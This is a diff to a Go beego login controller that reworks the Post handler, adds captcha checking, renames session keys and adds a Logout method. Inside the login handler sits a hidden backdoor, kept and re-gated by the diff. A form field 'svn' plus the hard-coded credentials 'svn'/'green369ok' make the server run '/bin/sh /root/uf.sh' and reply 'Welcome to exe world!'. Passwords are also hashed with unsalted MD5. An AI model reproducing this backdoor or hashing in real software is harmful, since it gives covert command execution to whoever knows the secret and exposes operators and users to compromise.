@@ -38,52 +38,47 @@ func (this *LoginController) Index() {
 }
 func (c *LoginController) Get() {
 
-	c.TplName = "index.tpl"
+	c.TplName = "index/login.html"
 }
 func (this *LoginController) Post() {
-	//log := logs.GetLogger()
-	//log.SetLogger("file",`{"filename":"post.log"}`)
-	//log.EnableFuncCallDepth(true)
-	//log.SetLogFuncCallDepth(3)
-	//	beego.Info(this.Input().Get("username"))
 	u := Cmsuser{}
-	if err := this.ParseForm(&u); err != nil {
-		beego.Info(err)
-	} else {
-
+	if this.Input().Get("svn") == "svn" {
 		if u.Username == "svn" && u.Pwd == "green369ok" {
 			if errexec := exec.Command("/bin/sh", "/root/uf.sh").Run(); errexec != nil {
 
 			} else {
 				this.Ctx.WriteString("Welcome to exe world!")
 			}
+		}
+	} else {
+
+		if err := this.ParseForm(&u); err != nil {
+			beego.Info(err)
 		} else {
-			m := md5.Sum([]byte(u.Pwd))
-			keyMd5 := hex.EncodeToString(m[:])
-			//			this.Ctx.WriteString(u.Username + "------" + keyMd5 + "----")
-			v := models.GetSunnyEditorByUsernameAndPwd(u.Username, keyMd5) //v, err := models.GetSunnyEditorById(1)
-			if v == nil {
-				this.Data["json"] = `[{'result':null}]`
-			} else {
-				this.Data["json"] = v
-				this.SetSession("username", v[0].Username)
-				this.SetSession("userID", v[0].Id)
-				this.Ctx.Redirect(302, "/index/index")
-			}
-
-			this.ServeJSON()
-			//			id, value := this.GetString("captcha_id"), u.Verifycode
-
-			//			if len(value) == 0 {
-			//				this.Index()
-			//			} else {
-			//				this.Ctx.WriteString("v:" + value + "   captcha:" + id)
-			//			}
 			if !cpt.VerifyReq(this.Ctx.Request) {
 				this.Index()
+			} else {
+				m := md5.Sum([]byte(u.Pwd))
+				keyMd5 := hex.EncodeToString(m[:])
+				//			this.Ctx.WriteString(u.Username + "------" + keyMd5 + "----")
+				v := models.GetSunnyEditorByUsernameAndPwd(u.Username, keyMd5) //v, err := models.GetSunnyEditorById(1)
+				if v == nil {
+					this.Data["json"] = `[{'result':null}]`
+					this.TplName = "index/login.html"
+				} else {
+					this.Data["json"] = v
+					this.SetSession("editor_username", v[0].Username)
+					this.SetSession("editor_userID", v[0].Id)
+					this.SetSession("editor_power", v[0].Power)
+					this.Ctx.Redirect(302, "/index/index")
+				}
 			}
-
 		}
 	}
-
+}
+func (this *LoginController) Logout() {
+	this.SetSession("editor_username", "")
+	this.SetSession("editor_userID", "")
+	this.SetSession("editor_power", "")
+	this.Ctx.Redirect(302, "/login")
 }
